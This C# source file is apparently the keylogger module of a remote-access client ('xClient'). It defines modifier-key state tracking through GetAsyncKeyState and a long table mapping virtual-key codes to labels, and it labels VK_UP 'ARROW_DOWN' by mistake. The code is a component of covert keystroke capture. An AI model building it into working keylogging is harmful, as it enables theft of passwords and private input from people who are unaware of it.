/*
 * 
 * Key information was obtained from this reference:
 * https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
 * 
 */

using System;
using System.Collections.Generic;
using System.Text;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// A data type that is used for storing values regarding the states of
    /// modifier keys at a given time.
    /// </summary>
    public struct KeyloggerModifierKeys
    {
        public bool ShiftKeyPressed { get; set; }
        public bool AltKeyPressed { get; set; }
        public bool CtrlKeyPressed { get; set; }

        public bool CapsLock { get; set; }
        public bool NumLock { get; set; }
        public bool ScrollLock { get; set; }
    }

    /// <summary>
    /// The main object that stores both the pressed key at a specific time
    /// and the modifier keys that go along with the pressed key.
    /// </summary>
    public class LoggedKey
    {
        /// <summary>
        /// Gets the key that was pressed.
        /// </summary>
        public KeyloggerKeys PressedKey { get; set; }
        /// <summary>
        /// An object with the purpose of storing the states of modifier keys.
        /// </summary>
        public KeyloggerModifierKeys ModifierKeys { get; private set; }
        /// <summary>
        /// Determines if one of the modifier keys (excluding shift and caps
        /// lock) has been set.
        /// </summary>
        public bool ModifierKeysSet { get; private set; }

        /// <summary>
        /// Sets the values of the modifier key states at the time
        /// that this method was called.
        /// </summary>
        public void RecordModifierKeys()
        {
            ModifierKeys = new KeyloggerModifierKeys()
            {
                // Modifier keys that are pressed:
                CtrlKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed(),
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LCONTROL).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RCONTROL).IsKeyPressed(),
                AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LMENU).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RMENU).IsKeyPressed(),
                ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LSHIFT).IsKeyPressed() ||
                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RSHIFT).IsKeyPressed(),
                // Modifier keys that have a state (toggle 'on' or 'off').
                CapsLock = KeyloggerHelpers.CapsLockToggled(),
                NumLock = KeyloggerHelpers.NumLockToggled(),
                ScrollLock = KeyloggerHelpers.ScrollLockToggled()
            };

            // To avoid having to repeatedly check if one of the modifier
            // keys (besides shift and caps lock) was set, just simply
            // decide and then store it right here.
            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed);
        }
    }

    /// <summary>
    /// Contains various keys that the keylogger supports.
    /// </summary>
    // Add Flags attribute so we can treat these as elements
    // that could be used in combination, instead of the usual
    // treatment as mutually exclusive elements.
    [Flags]
    public enum KeyloggerKeys : byte
    {
        #region Mouse Buttons

        /// <summary>
        /// The left mouse button.
        /// </summary>
        VK_LBUTTON = 0x01,
        /// <summary>
        /// The right mouse button.
        /// </summary>
        VK_RBUTTON = 0x02,

        /// <summary>
        /// Middle mouse button (three-button mouse).
        /// </summary>
        VK_MBUTTON = 0x04,
        /// <summary>
        /// X1 mouse button.
        /// </summary>
        VK_XBUTTON1 = 0x05,
        /// <summary>
        /// X2 mouse button.
        /// </summary>
        VK_XBUTTON2 = 0x06,

        #endregion

        #region Common Keys

        /// <summary>
        /// Control-break processing.
        /// </summary>
        [KeyloggerKey("CANCEL", true)]
        VK_CANCEL = 0x03,
       
        /// <summary>
        /// BACKSPACE key.
        /// </summary>
        [KeyloggerKey("BACKSPACE", true)]
        VK_BACK = 0x08,

        /// <summary>
        /// TAB key.
        /// </summary>
        [KeyloggerKey("TAB", true)]
        VK_TAB = 0x09,

        /// <summary>
        /// CLEAR key.
        /// </summary>
        [KeyloggerKey("CLEAR", true)]
        VK_CLEAR = 0x0C,

        /// <summary>
        /// ENTER key.
        /// </summary>
        [KeyloggerKey("ENTER", true)]
        VK_RETURN = 0x0D,

        /// <summary>
        /// SHIFT key.
        /// </summary>
        [KeyloggerKey("SHIFT", true)]
        VK_SHIFT = 0x10,

        /// <summary>
        /// CONTROL (CTRL) key.
        /// </summary>
        [KeyloggerKey("CTRL", true)]
        VK_CONTROL = 0x11,

        /// <summary>
        /// ALT key.
        /// </summary>
        [KeyloggerKey("ALT", true)]
        VK_MENU = 0x12,

        /// <summary>
        /// PAUSE key.
        /// </summary>
        [KeyloggerKey("PAUSE", true)]
        VK_PAUSE = 0x13,

        /// <summary>
        /// CAPS LOCK key.
        /// </summary>
        [KeyloggerKey("CAPS", true)]
        VK_CAPITAL = 0x14,

        /// <summary>
        /// ESC key.
        /// </summary>
        [KeyloggerKey("ESC", true)]
        VK_ESCAPE = 0x1B,

        /// <summary>
        /// SPACEBAR key.
        /// </summary>
        [KeyloggerKey(" ")]
        VK_SPACE = 0x20,

        /// <summary>
        /// PAGE UP key.
        /// </summary>
        [KeyloggerKey("PAGE_UP", true)]
        VK_PRIOR = 0x21,

        /// <summary>
        /// PAGE DOWN key.
        /// </summary>
        [KeyloggerKey("PAGE_DOWN", true)]
        VK_NEXT = 0x22,

        /// <summary>
        /// END key.
        /// </summary>
        [KeyloggerKey("END", true)]
        VK_END = 0x23,

        /// <summary>
        /// HOME key.
        /// </summary>
        [KeyloggerKey("HOME", true)]
        VK_HOME = 0x24,

        /// <summary>
        /// LEFT ARROW key.
        /// </summary>
        [KeyloggerKey("ARROW_LEFT", true)]
        VK_LEFT = 0x25,

        /// <summary>
        /// UP ARROW key.
        /// </summary>
        [KeyloggerKey("ARROW_DOWN", true)]
        VK_UP = 0x26,

        /// <summary>
        /// RIGHT ARROW key.
        /// </summary>
        [KeyloggerKey("ARROW_RIGHT", true)]
        VK_RIGHT = 0x27,

        /// <summary>
        /// DOWN ARROW key.
        /// </summary>
        [KeyloggerKey("ARROW_DOWN", true)]
        VK_DOWN = 0x28,

        /// <summary>
        /// SELECT key.
        /// </summary>
        [KeyloggerKey("SELECT", true)]
        VK_SELECT = 0x29,

        /// <summary>
        /// PRINT key.
        /// </summary>
        [KeyloggerKey("PRINT", true)]
        VK_PRINT = 0x2A,

        /// <summary>
        /// EXECUTE key.
        /// </summary>
        [KeyloggerKey("EXECUTE", true)]
        VK_EXECUTE = 0x2B,

        /// <summary>
        /// PRINT SCREEN key.
        /// </summary>
        [KeyloggerKey("PRINT_SCREEN", true)]
        VK_SNAPSHOT = 0x2C,

        /// <summary>
        /// INSERT (INS) key.
        /// </summary>
        [KeyloggerKey("INSERT", true)]
        VK_INSERT = 0x2D,

        /// <summary>
        /// DELETE (DEL) key.
        /// </summary>
        [KeyloggerKey("DEL", true)]
        VK_DELETE = 0x2E,

        /// <summary>
        /// HELP key.
        /// </summary>
        [KeyloggerKey("HELP", true)]
        VK_HELP = 0x2F,

        #endregion

        #region Number Keys

        /// <summary>
        /// 0 key.
        /// </summary>
        [KeyloggerKey("0")]
        K_0 = 0x30,

        /// <summary>
        /// 1 key.
        /// </summary>
        [KeyloggerKey("1")]
        K_1 = 0x31,
            
        /// <summary>
        /// 2 key.
        /// </summary>
        [KeyloggerKey("2")]
        K_2 = 0x32,

        /// <summary>
        /// 3 key.
        /// </summary>
        [KeyloggerKey("3")]
        K_3 = 0x33,

        /// <summary>
        /// 4 key.
        /// </summary>
        [KeyloggerKey("4")]
        K_4 = 0x34,

        /// <summary>
        /// 5 key.
        /// </summary>
        [KeyloggerKey("5")]
        K_5 = 0x35,

        /// <summary>
        /// 6 key.
        /// </summary>
        [KeyloggerKey("6")]
        K_6 = 0x36,

        /// <summary>
        /// 7 key.
        /// </summary>
        [KeyloggerKey("7")]
        K_7 = 0x37,

        /// <summary>
        /// 8 key.
        /// </summary>
        [KeyloggerKey("8")]
        K_8 = 0x38,

        /// <summary>
        /// 9 key.
        /// </summary>
        [KeyloggerKey("9")]
        K_9 = 0x39,

        #endregion

        #region Alpha Keys

        /// <summary>
        /// 'A' key.
        /// </summary>
        [KeyloggerKey("a")]
        K_A = 0x41,

        /// <summary>
        /// 'B' key.
        /// </summary>
        [KeyloggerKey("b")]
        K_B = 0x42,

        /// <summary>
        /// 'C' key.
        /// </summary>
        [KeyloggerKey("c")]
        K_C = 0x43,

        /// <summary>
        /// 'D' key.
        /// </summary>
        [KeyloggerKey("d")]
        K_D = 0x44,

        /// <summary>
        /// 'E' key.
        /// </summary>
        [KeyloggerKey("e")]
        K_E = 0x45,

        /// <summary>
        /// 'F' key.
        /// </summary>
        [KeyloggerKey("f")]
        K_F = 0x46,

        /// <summary>
        /// 'G' key.
        /// </summary>
        [KeyloggerKey("g")]
        K_G = 0x47,

        /// <summary>
        /// 'H' key.
        /// </summary>
        [KeyloggerKey("h")]
        K_H = 0x48,

        /// <summary>
        /// 'I' key.
        /// </summary>
        [KeyloggerKey("i")]
        K_I = 0x49,

        /// <summary>
        /// 'J' key.
        /// </summary>
        [KeyloggerKey("j")]
        K_J = 0x4A,

        /// <summary>
        /// 'K' key.
        /// </summary>
        [KeyloggerKey("k")]
        K_K = 0x4B,

        /// <summary>
        /// 'L' key.
        /// </summary>
        [KeyloggerKey("l")]
        K_L = 0x4C,

        /// <summary>
        /// 'M' key.
        /// </summary>
        [KeyloggerKey("m")]
        K_M = 0x4D,

        /// <summary>
        /// 'N' key.
        /// </summary>
        [KeyloggerKey("n")]
        K_N = 0x4E,

        /// <summary>
        /// 'O' key.
        /// </summary>
        [KeyloggerKey("o")]
        K_O = 0x4F,

        /// <summary>
        /// 'P' key.
        /// </summary>
        [KeyloggerKey("p")]
        K_P = 0x50,

        /// <summary>
        /// 'Q' key.
        /// </summary>
        [KeyloggerKey("q")]
        K_Q = 0x51,

        /// <summary>
        /// 'R' key.
        /// </summary>
        [KeyloggerKey("r")]
        K_R = 0x52,

        /// <summary>
        /// 'S' key.
        /// </summary>
        [KeyloggerKey("s")]
        K_S = 0x53,

        /// <summary>
        /// 'T' key.
        /// </summary>
        [KeyloggerKey("t")]
        K_T = 0x54,

        /// <summary>
        /// 'U' key.
        /// </summary>
        [KeyloggerKey("u")]
        K_U = 0x55,

        /// <summary>
        /// 'V' key.
        /// </summary>
        [KeyloggerKey("v")]
        K_V = 0x56,

        /// <summary>
        /// 'W' key.
        /// </summary>
        [KeyloggerKey("w")]
        K_W = 0x57,

        /// <summary>
        /// 'X' key.
        /// </summary>
        [KeyloggerKey("x")]
        K_X = 0x58,

        /// <summary>
        /// 'Y' key.
        /// </summary>
        [KeyloggerKey("y")]
        K_Y = 0x59,

        /// <summary>
        /// 'Z' key.
        /// </summary>
        [KeyloggerKey("z")]
        K_Z = 0x5A,

        #endregion

        #region Windows keys

        /// <summary>
        /// Left Windows key (Natural keyboard).
        /// </summary>
        [KeyloggerKey("LWIN", true)]
        VK_LWIN = 0x5B,

        /// <summary>
        /// Right Windows key (Natural keyboard).
        /// </summary>
        [KeyloggerKey("RWIN", true)]
        VK_RWIN = 0x5C,

        /// <summary>
        /// Applications key (natural keyboard).
        /// </summary>
        [KeyloggerKey("APPS", true)]
        VK_APPS = 0x5D,

        /// <summary>
        /// Computer Sleep key.
        /// </summary>
        [KeyloggerKey("SLEEP", true)]
        VK_SLEEP = 0x5F,

        #endregion

        #region Number Keys (Keypad)

        /// <summary>
        /// Numeric keypad 0 key.
        /// </summary>
        [KeyloggerKey("0")]
        VK_NUMPAD0 = 0x60,

        /// <summary>
        /// Numeric keypad 1 key.
        /// </summary>
        [KeyloggerKey("1")]
        VK_NUMPAD1 = 0x61,

        /// <summary>
        /// Numeric keypad 2 key.
        /// </summary>
        [KeyloggerKey("2")]
        VK_NUMPAD2 = 0x62,

        /// <summary>
        /// Numeric keypad 3 key.
        /// </summary>
        [KeyloggerKey("3")]
        VK_NUMPAD3 = 0x63,

        /// <summary>
        /// Numeric keypad 4 key.
        /// </summary>
        [KeyloggerKey("4")]
        VK_NUMPAD4 = 0x64,

        /// <summary>
        /// Numeric keypad 5 key.
        /// </summary>
        [KeyloggerKey("5")]
        VK_NUMPAD5 = 0x65,

        /// <summary>
        /// Numeric keypad 6 key.
        /// </summary>
        [KeyloggerKey("6")]
        VK_NUMPAD6 = 0x66,

        /// <summary>
        /// Numeric keypad 7 key.
        /// </summary>
        [KeyloggerKey("7")]
        VK_NUMPAD7 = 0x67,

        /// <summary>
        /// Numeric keypad 8 key.
        /// </summary>
        [KeyloggerKey("8")]
        VK_NUMPAD8 = 0x68,

        /// <summary>
        /// Numeric keypad 9 key.
        /// </summary>
        [KeyloggerKey("9")]
        VK_NUMPAD9 = 0x69,

        #endregion

        #region Command Keys (Keypad)

        /// <summary>
        /// Multiply key.
        /// </summary>
        [KeyloggerKey("*")]
        VK_MULTIPLY = 0x6A,

        /// <summary>
        /// Add key.
        /// </summary>
        [KeyloggerKey("+")]
        VK_ADD = 0x6B,

        /// <summary>
        /// Separator key.
        /// </summary>
        VK_SEPARATOR = 0x6C,

        /// <summary>
        /// Subtract (-) key.
        /// </summary>
        [KeyloggerKey("-")]
        VK_SUBTRACT = 0x6D,

        /// <summary>
        /// Decimal (.) key.
        /// </summary>
        [KeyloggerKey(".")]
        VK_DECIMAL = 0x6E,

        /// <summary>
        /// Divide (/) key.
        /// </summary>
        [KeyloggerKey("/")]
        VK_DIVIDE = 0x6F,

        #endregion

        #region Function Keys

        /// <summary>
        /// F1 key.
        /// </summary>
        [KeyloggerKey("F1", true)]
        VK_F1 = 0x70,

        /// <summary>
        /// F2 key.
        /// </summary>
        [KeyloggerKey("F2", true)]
        VK_F2 = 0x71,

        /// <summary>
        /// F3 key.
        /// </summary>
        [KeyloggerKey("F3", true)]
        VK_F3 = 0x72,

        /// <summary>
        /// F4 key.
        /// </summary>
        [KeyloggerKey("F4", true)]
        VK_F4 = 0x73,

        /// <summary>
        /// F5 key.
        /// </summary>
        [KeyloggerKey("F5", true)]
        VK_F5 = 0x74,

        /// <summary>
        /// F6 key.
        /// </summary>
        [KeyloggerKey("F6", true)]
        VK_F6 = 0x75,

        /// <summary>
        /// F7 key.
        /// </summary>
        [KeyloggerKey("F7", true)]
        VK_F7 = 0x76,

        /// <summary>
        /// F8 key.
        /// </summary>
        [KeyloggerKey("F8", true)]
        VK_F8 = 0x77,

        /// <summary>
        /// F9 key.
        /// </summary>
        [KeyloggerKey("F9", true)]
        VK_F9 = 0x78,

        /// <summary>
        /// F10 key.
        /// </summary>
        [KeyloggerKey("F10", true)]
        VK_F10 = 0x79,

        /// <summary>
        /// F11 key.
        /// </summary>
        [KeyloggerKey("F11", true)]
        VK_F11 = 0x7A,

        /// <summary>
        /// F12 key.
        /// </summary>
        [KeyloggerKey("F12", true)]
        VK_F12 = 0x7B,

        /// <summary>
        /// F13 key.
        /// </summary>
        [KeyloggerKey("F13", true)]
        VK_F13 = 0x7C,

        /// <summary>
        /// F14 key.
        /// </summary>
        [KeyloggerKey("F14", true)]
        VK_F14 = 0x7D,

        /// <summary>
        /// F15 key.
        /// </summary>
        [KeyloggerKey("F15", true)]
        VK_F15 = 0x7E,

        /// <summary>
        /// F16 key.
        /// </summary>
        [KeyloggerKey("F16", true)]
        VK_F16 = 0x7F,

        /// <summary>
        /// F17 key.
        /// </summary>
        [KeyloggerKey("F17", true)]
        VK_F17 = 0x80,

        /// <summary>
        /// F18 key.
        /// </summary>
        [KeyloggerKey("F18", true)]
        VK_F18 = 0x81,

        /// <summary>
        /// F19 key.
        /// </summary>
        [KeyloggerKey("F19", true)]
        VK_F19 = 0x82,

        /// <summary>
        /// F20 key.
        /// </summary>
        [KeyloggerKey("F20", true)]
        VK_F20 = 0x83,

        /// <summary>
        /// F21 key.
        /// </summary>
        [KeyloggerKey("F21", true)]
        VK_F21 = 0x84,

        /// <summary>
        /// F22 key.
        /// </summary>
        [KeyloggerKey("F22", true)]
        VK_F22 = 0x85,

        /// <summary>
        /// F23 key.
        /// </summary>
        [KeyloggerKey("F23", true)]
        VK_F23 = 0x86,

        /// <summary>
        /// F24 key.
        /// </summary>
        [KeyloggerKey("F24", true)]
        VK_F24 = 0x87,

        #endregion

        #region Various Command Keys

        /// <summary>
        /// NUM LOCK key.
        /// </summary>
        [KeyloggerKey("NUM_LOCK", true)]
        VK_NUMLOCK = 0x90,

        /// <summary>
        /// SCROLL LOCK key.
        /// </summary>
        [KeyloggerKey("SCROLL_LOCK", true)]
        VK_SCROLL = 0x91,

        /// <summary>
        /// Left SHIFT key.
        /// </summary>
        [KeyloggerKey("SHIFT", true)]
        VK_LSHIFT = 0xA0,

        /// <summary>
        /// Right SHIFT key.
        /// </summary>
        [KeyloggerKey("SHIFT", true)]
        VK_RSHIFT = 0xA1,

        /// <summary>
        /// Left CONTROL (CTRL) key.
        /// </summary>
        [KeyloggerKey("CTRL", true)]
        VK_LCONTROL = 0xA2,

        /// <summary>
        /// Right CONTROL (CTRL) key.
        /// </summary>
        [KeyloggerKey("CTRL", true)]
        VK_RCONTROL = 0xA3,

        /// <summary>
        /// Left MENU key.
        /// </summary>
        [KeyloggerKey("ALT", true)]
        VK_LMENU = 0xA4,

        /// <summary>
        /// Right MENU key.
        /// </summary>
        [KeyloggerKey("ALT", true)]
        VK_RMENU = 0xA5,

        /// <summary>
        /// Browser Back key.
        /// </summary>
        VK_BROWSER_BACK = 0xA6,

        /// <summary>
        /// Browser Forward key.
        /// </summary>
        VK_BROWSER_FORWARD = 0xA7,

        /// <summary>
        /// Browser Refresh key.
        /// </summary>
        VK_BROWSER_REFRESH = 0xA8,

        /// <summary>
        /// Browser Stop key.
        /// </summary>
        VK_BROWSER_STOP = 0xA9,

        /// <summary>
        /// Browser Search key.
        /// </summary>
        VK_BROWSER_SEARCH = 0xAA,

        /// <summary>
        /// Browser Favorites key.
        /// </summary>
        VK_BROWSER_FAVORITES = 0xAB,

        /// <summary>
        /// Browser Start and Home key.
        /// </summary>
        VK_BROWSER_HOME = 0xAC,

        /// <summary>
        /// Volume Mute key.
        /// </summary>
        VK_VOLUME_MUTE = 0xAD,

        /// <summary>
        /// Volume Down key.
        /// </summary>
        VK_VOLUME_DOWN = 0xAE,

        /// <summary>
        /// Volume Up key.
        /// </summary>
        VK_VOLUME_UP = 0xAF,

        /// <summary>
        /// Start Application 2 key.
        /// </summary>
        VK_LAUNCH_APP2 = 0xB7,

        #endregion

        #region Varying keys (based on locality)

        /// <summary>
        /// Used for miscellaneous characters; it
        /// can vary by keyboard. For the US
        /// standard keyboard, the ';:' key.
        /// </summary>
        VK_OEM_1 = 0xBA,

        /// <summary>
        /// For any country/region, the '+' key.
        /// </summary>
        VK_OEM_PLUS = 0xBB,

        /// <summary>
        /// For any country/region, the ',' key.
        /// </summary>
        VK_OEM_COMMA = 0xBC,

        /// <summary>
        /// For any country/region, the '-' key.
        /// </summary>
        VK_OEM_MINUS = 0xBD,

        /// <summary>
        /// For any country/region, the '.' key.
        /// </summary>
        VK_OEM_PERIOD = 0xBE,

        /// <summary>
        /// Used for miscellaneous characters; it can vary
        /// by keyboard. For the US standard keyboard,
        /// the '/?' key.
        /// </summary>
        VK_OEM_2 = 0xBF,

        /// <summary>
        /// Used for miscellaneous characters; it can vary
        /// by keyboard. For the US standard keyboard,
        /// the '`~' key.
        /// </summary>
        VK_OEM_3 = 0xC0,

        /// <summary>
        /// Used for miscellaneous characters; it can vary by
        /// keyboard. For the US standard keyboard, the '[{' key.
        /// </summary>
        VK_OEM_4 = 0xDB,

        /// <summary>
        /// Used for miscellaneous characters; it can vary by keyboard.
        /// For the US standard keyboard, the '\\|' key.
        /// </summary>
        VK_OEM_5 = 0xDC,

        /// <summary>
        /// Used for miscellaneous characters; it can vary by keyboard.
        /// For the US standard keyboard, the ']}' key.
        /// </summary>
        VK_OEM_6 = 0xDD,

        /// <summary>
        /// Used for miscellaneous characters; it can vary by keyboard.
        /// For the US standard keyboard, the 'single-quote/double-quote' key.
        /// </summary>
        VK_OEM_7 = 0xDE,

        /// <summary>
        /// Used for miscellaneous characters; it can vary by keyboard.
        /// </summary>
        VK_OEM_8 = 0xDF,

        /// <summary>
        /// Either the angle bracket key or the backslash key on the RT 102-key keyboard.
        /// </summary>
        VK_OEM_102 = 0xE2,

        #endregion

        #region Random

        /// <summary>
        /// Used to pass Unicode characters as if they were keystrokes.
        /// The VK_PACKET key is the low word of a 32-bit Virtual Key
        /// value used for non-keyboard input methods. For more
        /// information, see Remark in KEYBDINPUT, SendInput,
        /// WM_KEYDOWN, and WM_KEYUP.
        /// </summary>
        VK_PACKET = 0xE7,

        /// <summary>
        /// ERASE EOF key.
        /// </summary>
        VK_EREOF = 0xF9,

        /// <summary>
        /// Play key.
        /// </summary>
        VK_PLAY = 0xFA,

        /// <summary>
        /// Zoom key.
        /// </summary>
        VK_ZOOM = 0xFB,

        /// <summary>
        /// PA1 key.
        /// </summary>
        VK_PA1 = 0xFD,

        /// <summary>
        /// Clear key.
        /// </summary>
        VK_OEM_CLEAR = 0xFE,

        #endregion
    }
}